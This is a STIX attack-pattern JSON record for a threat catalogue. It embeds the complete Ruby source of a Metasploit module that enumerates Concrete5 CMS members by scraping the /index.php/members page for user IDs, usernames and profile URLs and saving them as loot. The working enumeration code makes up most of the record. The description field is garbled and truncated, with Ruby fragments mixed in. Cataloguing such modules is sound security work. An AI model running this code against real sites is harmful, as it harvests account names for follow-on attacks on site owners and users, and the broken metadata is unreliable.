{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--073aaf80-1a81-48b5-9419-2890756b2c70",
    "created": "2024-08-14T16:31:00.910713Z",
    "modified": "2024-08-14T16:31:00.910718Z",
    "name": "Concrete5 Member List Enumeration",
    "description": " This module extracts username information from the Concrete5 member page  'References'   => [ # General",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/concrete5_member_list.rb",
            "external_id": "concrete5_member_list.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.concretecms.com/"
        },
        {
            "source_name": "reference",
            "url": "https://web.archive.org/web/20120704205851/http://www.concrete5.org/documentation/using-concrete5/dashboard/users-and-groups/"
        },
        {
            "source_name": "#separateuserdataintouserID",
            "external_id": "usernameandProfileURL"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n\n  def initialize\n    super(\n      'Name'         => 'Concrete5 Member List Enumeration',\n      'Description'  => %q{\n        This module extracts username information from the Concrete5 member page\n        },\n      'References'   =>\n        [\n          # General\n          [ 'URL', 'https://blog.c22.cc/' ],\n          # Concrete5\n          [ 'URL', 'https://www.concretecms.com/'],\n          [ 'URL', 'https://web.archive.org/web/20120704205851/http://www.concrete5.org/documentation/using-concrete5/dashboard/users-and-groups/']\n        ],\n      'Author'       => [ 'Chris John Riley' ],\n      'License'      => MSF_LICENSE\n    )\n\n    register_options(\n      [\n        Opt::RPORT(80),\n        OptString.new('URI', [false, 'URL of the Concrete5 root', '/'])\n      ])\n  end\n\n  def run_host(rhost)\n    url = normalize_uri(datastore['URI'], '/index.php/members')\n\n    begin\n      res = send_request_raw({'uri' => url})\n\n    rescue ::Rex::ConnectionError\n      print_error(\"#{peer} Unable to connect to #{url}\")\n      return\n    end\n\n    if not res\n      print_error(\"#{peer} Unable to connect to #{url}\")\n      return\n    end\n\n    # extract member info from response if present\n    if res and res.body =~ /ccm\\-profile\\-member\\-username/i\n      extract_members(res, url)\n    elsif res\n      print_line(res.body)\n      print_status(\"#{peer} No members listed or profiles disabled\")\n    else\n      print_error(\"#{peer} No response received\")\n    end\n\n  end\n\n  def extract_members(res, url)\n    members = res.get_html_document.search('div[@class=\"ccm-profile-member-username\"]')\n\n    unless members.empty?\n      print_good(\"#{peer} Extracted #{members.length} entries\")\n\n      # separate user data into userID, username and Profile URL\n      memberlist = []\n      users = []\n\n      members.each do | mem |\n        userid = mem.text.scan(/\\/view\\/(\\d+)/i).flatten.first\n        anchor = mem.at('a')\n        username = anchor.text\n        profile = anchor.attributes['href'].value\n        # add all data to memberlist for table output\n\n        memberlist.push([userid, username, profile])\n        # add usernames to users array for reporting\n        users.push(username)\n      end\n\n      membertbl = Msf::Ui::Console::Table.new(\n            Msf::Ui::Console::Table::Style::Default, {\n            'Header'    => \"Concrete5 members\",\n            'Prefix'  => \"\\n\",\n            'Postfix' => \"\\n\",\n            'Indent'    => 1,\n            'Columns'   =>\n            [\n              \"UserID\",\n              \"Username\",\n              \"Profile\"\n            ]})\n\n      memberlist.each do | mem |\n        membertbl << [mem[0], mem[1], mem[2]]\n      end\n\n      # print table\n      print_line(membertbl.to_s)\n\n      # store username to loot\n      report_note({\n        :host => rhost,\n        :port => rport,\n        :proto => 'tcp',\n        :type => \"concrete5 CMS members\",\n        :data => {:proto => \"http\", :users => users.join(\",\")}\n      })\n\n    else\n      print_error(\"#{peer} Unable to extract members\")\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        "[ Chris John Riley ]",
        ""
    ]
}